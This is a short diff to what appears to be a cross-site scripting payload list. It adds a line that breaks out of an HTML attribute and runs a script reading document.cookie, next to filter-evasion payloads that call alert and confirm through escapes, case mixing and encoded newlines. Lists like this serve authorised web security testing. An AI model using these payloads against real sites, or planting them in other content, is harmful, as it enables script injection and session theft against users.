@@ -5,6 +5,7 @@ toString=\u0061lert;windows+''
 ('/alert?.(7)/')
 '/alert?.(7)/'
 ${alert`XSS`}
+"><script>alert(document.cookie)<~2Fscript>
 '-(a=window.alert,http://a.call(this,"BOO"))-'
 -(a=window.alert,http://a.call(this,"BOO"))-
 "><deTAIls/+/oNTogGLE%0A=%0Aconfirm()%0Dx>
